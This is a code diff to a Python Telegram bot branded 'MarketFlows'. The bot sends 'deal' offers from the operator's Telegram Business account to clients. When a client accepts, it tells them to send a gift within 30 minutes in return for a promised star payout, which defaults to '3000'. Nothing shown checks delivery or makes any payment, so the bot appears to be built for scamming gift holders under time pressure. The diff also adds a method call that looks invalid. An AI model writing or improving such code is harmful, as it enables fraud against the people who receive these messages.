@@ -20,12 +20,12 @@ BRAND = "MarketFlows"
 DB_PATH = "marketflows.db"  
 
 active_business_connection_id = None
-active_business_chats = {} # chat_id -> name
+last_business_chat_id = None
+last_business_chat_name = None
 
 def db_init():  
     conn = sqlite3.connect(DB_PATH)  
     c = conn.cursor()  
-    c.execute("""CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, lang TEXT DEFAULT 'ru')""")
     c.execute("""CREATE TABLE IF NOT EXISTS deals (  
         id INTEGER PRIMARY KEY AUTOINCREMENT,  
         code TEXT UNIQUE,  
@@ -70,12 +70,12 @@ async def business_connection_handler(bc: BusinessConnection):
 
 @router.message(F.business_connection_id.is_not(None))
 async def business_message_handler(msg: Message):
-    global active_business_connection_id
+    global active_business_connection_id, last_business_chat_id, last_business_chat_name
     if msg.business_connection_id:
         active_business_connection_id = msg.business_connection_id
     if msg.chat and msg.chat.id != msg.from_user.id:
-        name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or str(msg.chat.id))
-        active_business_chats[msg.chat.id] = name
+        last_business_chat_id = msg.chat.id
+        last_business_chat_name = f"@{msg.chat.username}" if msg.chat.username else (msg.chat.first_name or "Клиент")
 
 @router.message(CommandStart())  
 async def cmd_start(msg: Message):  
@@ -101,11 +101,8 @@ async def cmd_start(msg: Message):
 
 @router.message(F.text == "📂 Мои чаты")
 async def chats_list(msg: Message):
-    if active_business_chats:
-        text = "📋 <b>Активные чаты Telegram Business:</b>\n\n" + "\n".join([f"• {name} (ID: <code>{cid}</code>)" for cid, name in active_business_chats.items()])
-    else:
-        text = "ℹ️ Нет активных чатов. Напишите кому-нибудь с бизнес-аккаунта."
-    await msg.answer(text, parse_mode="HTML", reply_markup=main_menu())
+    target = f"{last_business_chat_name} (ID: <code>{last_business_chat_id}</code>)" if last_business_chat_id else "Нет активных чатов"
+    await msg.answer(f"📋 <b>Последний бизнес-чат:</b> {target}", parse_mode="HTML", reply_markup=main_menu())
 
 @router.message(F.text == "🤝 Создать сделку")
 async def create_deal_btn(msg: Message):
@@ -117,13 +114,6 @@ async def handle_deal_creation_text(msg: Message):
         return
 
     full_text = msg.text.strip()
-    words = full_text.split()
-    gift_link = "https://t.me/nft/Gift"
-    for w in words:
-        if w.startswith("http://") or w.startswith("https://"):
-            gift_link = w
-            break
-
     code = secrets.token_hex(4).upper()
     expires_at = datetime.utcnow() + timedelta(minutes=30)
     
@@ -131,28 +121,23 @@ async def handle_deal_creation_text(msg: Message):
     conn.execute(  
         "INSERT INTO deals (code, creator_id, creator_username, custom_text, gift_link, status, expires_at, created_at) "  
         "VALUES (?,?,?,?,?,?,?,?)",  
-        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), full_text, gift_link, 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
+        (code, msg.from_user.id, f"@{msg.from_user.username}" if msg.from_user.username else str(msg.from_user.id), full_text, "https://t.me/nft/Gift", 'pending', expires_at.isoformat(), datetime.utcnow().isoformat())  
     )  
     conn.commit()  
     conn.close()
 
-    buttons = [
+    target_chat = last_business_chat_id if last_business_chat_id else msg.chat.id
+    btn_name = last_business_chat_name if last_business_chat_name else "Тест"
+
+    kb = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text=f"📤 Отправить: {btn_name}", callback_data=f"sendtochat_{code}_{target_chat}")],
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
             InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
         ]
-    ]
-    
-    if active_business_chats:
-        for cid, name in active_business_chats.items():
-            buttons.insert(0, [InlineKeyboardButton(text=f"Отправить: {name}", callback_data=f"sendtochat_{code}_{cid}")])
-    else:
-        buttons.insert(0, [InlineKeyboardButton(text="Отправить: Тест (себе)", callback_data=f"sendtochat_{code}_{msg.chat.id}")])
+    ])
 
-    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
-    preview_text = f"{full_text}\n\n{gift_link}"
-
-    await msg.answer(text=preview_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
+    await msg.answer(text=full_text, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
 
 @router.callback_query(F.data.startswith("sendtochat_"))
 async def send_to_chat(cb: CallbackQuery):
@@ -166,9 +151,6 @@ async def send_to_chat(cb: CallbackQuery):
         return
 
     custom_text = deal[4]
-    gift_link = deal[5]
-    text_msg = f"{custom_text}\n\n{gift_link}"
-
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [
             InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
@@ -176,13 +158,11 @@ async def send_to_chat(cb: CallbackQuery):
         ]
     ])
 
-    target_name = active_business_chats.get(target_chat_id, "клиенту")
-
     try:
         if active_business_connection_id:
             await cb.bot.send_message(
                 chat_id=target_chat_id,
-                text=text_msg,
+                text=custom_text,
                 parse_mode="HTML",
                 reply_markup=kb,
                 disable_web_page_preview=False,
@@ -191,16 +171,16 @@ async def send_to_chat(cb: CallbackQuery):
         else:
             await cb.bot.send_message(
                 chat_id=target_chat_id,
-                text=text_msg,
+                text=custom_text,
                 parse_mode="HTML",
                 reply_markup=kb,
                 disable_web_page_preview=False
             )
         
         await cb.message.edit_reply_markup(reply_markup=None)
-        await cb.answer(f"Отправлено: {target_name}. Telegram подтвердил. Кнопки прикреплены.", show_alert=True)
+        await cb.answer("Ордер успешно отправлен!", show_alert=True)
     except Exception as e:
-        await cb.answer(f"Ошибка отправки: {e}", show_alert=True)
+        await cb.answer(f"Ошибка: {e}", show_alert=True)
 
 @router.callback_query(F.data.startswith("sel_accept_"))
 async def sel_accept(cb: CallbackQuery):
@@ -215,18 +195,16 @@ async def sel_accept(cb: CallbackQuery):
     amount_str = numbers[0] if numbers else "3000"
 
     set_db_status(code, "accepted")
-    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ автоматически пополнятся на ваш аккаунт.", show_alert=True)
+    await cb.answer(f"Отправьте подарок в течение 30 минут, и {amount_str} ⭐ поступят на ваш аккаунт.", show_alert=True)
 
     gift_link = deal[5]
     expires_at = datetime.fromisoformat(deal[7]) if deal[7] else datetime.utcnow() + timedelta(minutes=30)
-    
     diff = expires_at - datetime.utcnow()
     total_secs = max(0, int(diff.total_seconds()))
     mins, secs = divmod(total_secs, 60)
     timer_str = f"{mins:02d}:{secs:02d}"
 
-    text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
-
+    text_msg = f"{custom_text}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
     kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
         [
@@ -247,42 +225,9 @@ async def sel_accept(cb: CallbackQuery):
                 business_connection_id=active_business_connection_id
             )
         else:
-            await cb.message.edit_text(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
-        asyncio.create_task(run_animation_timer(cb.bot, cb.message.chat.id, cb.message.message_id, code, gift_link, custom_text, expires_at, active_business_connection_id))
+            await cb.bot.edit_text(text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
     except Exception:
         pass
-
-async def run_animation_timer(bot: Bot, chat_id: int, message_id: int, code: str, gift_link: str, custom_text: str, expires_at: datetime, biz_id: str):
-    while True:
-        await asyncio.sleep(30)
-        deal = get_deal(code)
-        if not deal or deal[6] != 'accepted':
-            break
-
-        diff = expires_at - datetime.utcnow()
-        total_secs = int(diff.total_seconds())
-        if total_secs <= 0:
-            break
-
-        mins, secs = divmod(total_secs, 60)
-        timer_str = f"{mins:02d}:{secs:02d}"
-
-        text_msg = f"{custom_text}\n\n{gift_link}\n\n⏳ <b>Предложение активно ещё {timer_str}</b>"
-        kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="🎁 ПОКАЗАТЬ ПОДАРОК", url=gift_link)],
-            [
-                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"sel_reject_{code}"),
-                InlineKeyboardButton(text="✅ Принять", callback_data=f"sel_accept_{code}")
-            ]
-        ])
-
-        try:
-            if biz_id:
-                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False, business_connection_id=biz_id)
-            else:
-                await bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text_msg, parse_mode="HTML", reply_markup=kb, disable_web_page_preview=False)
-        except Exception:
-            break
 
 @router.callback_query(F.data.startswith("sel_reject_"))
 async def sel_reject(cb: CallbackQuery):
@@ -303,7 +248,6 @@ async def main():
     await bot.delete_webhook(drop_pending_updates=True)  
     dp = Dispatcher(storage=MemoryStorage())  
     dp.include_router(router)  
-    print(f"[{BRAND}] Бот успешно запущен.")  
     await dp.start_polling(bot)  
 
 if __name__ == "__main__":  
